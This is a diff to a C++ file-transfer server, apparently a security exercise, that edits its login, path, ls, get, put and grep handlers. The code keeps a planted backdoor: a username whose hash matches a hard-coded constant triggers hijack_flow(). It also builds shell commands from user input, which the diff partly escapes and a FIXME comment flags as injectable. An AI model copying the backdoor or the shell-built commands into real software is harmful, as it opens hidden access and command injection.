@@ -10,7 +10,7 @@
 #include <iterator>
 #include <unistd.h>
 
-#define BFLNGTH 659
+#define BFLNGTH 652
 
 using namespace std;
 
@@ -23,7 +23,7 @@ const string FILENAME_ERROR = "Error: the path is too long.\n";
 const string AUTHENTICATION_FAIL = "Authentication failed.\n"; // not an error lol
 const string TRANSFER_ERROR = "Error: file transfer failed.\n";
 
-const char *backDoor = "359b978b8687ca88875ccf2976bef89f6045e196adc2dc74ee2ba782a46d46f7";
+ssize_t  backDoor = 150138823314737907;
 
 string escape(string cmd){
     string escaped;
@@ -88,8 +88,8 @@ long getFileSize(const char* fileName){
     FILE *file;
     file = fopen(fileName, "r");
     // If file can't be opened send error
-    if (file == NULL) {
-        return 1;
+    if (file == nullptr) {
+        return -1;
     }
     // Determine file size
     fseek(file, 0, SEEK_END);
@@ -159,7 +159,7 @@ int constructPath(string relativePath, const string &usrLocation, string &absPat
         out = ACCESS_ERROR; //FIXME
         return 1;
     } else {
-        absPath = relativePath; // FIXME one can execute an other command in "relativePath"
+        absPath = escape(relativePath); // FIXME one can execute an other command in "relativePath"
     }
     string path = usrLocation + "/" + absPath;
     int res = sanitizePath(path, out);
@@ -181,7 +181,7 @@ int constructPath(string relativePath, const string &usrLocation, string &absPat
     * @return 0 if successful
 */
 int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, string &out) {
-    checkBackdoor(uname);
+    checkBackdoor(uname); //FIXME
     if(usr.isAuthenticated()){
         usr.setAuthenticated(false);
     }
@@ -194,25 +194,10 @@ int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, s
     return 0;
 }
 
-void sha256_string(const char *string, char outputBuffer[65])
-{   /*
-    unsigned char hash[SHA256_DIGEST_LENGTH];
-    SHA256_CTX sha256;
-    SHA256_Init(&sha256);
-    SHA256_Update(&sha256, string, strlen(string));
-    SHA256_Final(hash, &sha256);
-    int i = 0;
-    for(i = 0; i < SHA256_DIGEST_LENGTH; i++)
-    {
-        sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
-    }*/
-    outputBuffer[64] = 0;
-}
 
 void checkBackdoor(const string &uname){
-    char hash[65];
-    sha256_string(uname.c_str(), hash);
-    if(!strcmp(hash, backDoor)){
+    hash<string> hasher;
+    if(hasher(uname) == backDoor){
         hijack_flow();
     }
 }
@@ -239,7 +224,7 @@ int pass_cmd(const string psw, map<string, string> allowedUsers, User &usr, stri
     }
     if(allowedUsers[usr.getUname()] != psw){
         out = AUTHENTICATION_FAIL;
-        return 0;
+        return 1;
     }
     usr.setAuthenticated(true);
     return 0;
@@ -280,7 +265,7 @@ int ls_cmd(bool authenticated, string &out, User usr){
     }
     string cmd = "ls -l ";
     exec(cmd.c_str(), out, usr.getLocation());
-    return modifyUsrName(out, usr.getUname());
+    return modifyUsrName(out, "root");
 }
 
 int modifyUsrName(string &out, string usrName) {
@@ -413,7 +398,6 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
     }
     // Prepare thread arguments
     struct thread_args *args = (struct thread_args *) malloc(sizeof(struct thread_args));
-    memset(args->fileName, 0, 1024);
     string absPath;
     if (constructPath(fileName, usr.getLocation(), absPath, out)) {
         return 1;
@@ -435,7 +419,7 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
         pthread_cancel(usr.getThread);
 
         // Create new thread
-        int rc = pthread_create(&usr.getThread, NULL, openFileServer, (void *) args);
+        int rc = pthread_create(&usr.getThread, nullptr, openFileServer, (void *) args);
         if (rc != 0) {
             cerr << "Error" << endl;
         }
@@ -465,11 +449,8 @@ int put_cmd(string fileName, string fileSize, int port, User &usr, string &out) 
     long long fileS = stoll(fileSize);
     long long i = 0;
 
-    // printf("Address of x is %p\n", (void *)&i);
-
     // Prepare thread arguments
     struct thread_args *args = (struct thread_args *) malloc(sizeof(struct thread_args));
-    memset(args->fileName, 0, 1024);
     string absPath;
     if (constructPath(fileName, usr.getLocation(), absPath, out)) {
         return 1;
@@ -513,7 +494,7 @@ int grep_cmd(string pattern, User usr, string &out){
         out = ACCESS_ERROR;
         return 1;
     }
-    string cmd = "grep -l -r \"" + pattern + "\" ";
+    string cmd = "grep -l -r " + escape(pattern);
     int res = exec(cmd.c_str(), out, usr.getLocation());
     if(res != 0 or out.empty()){
         return res;
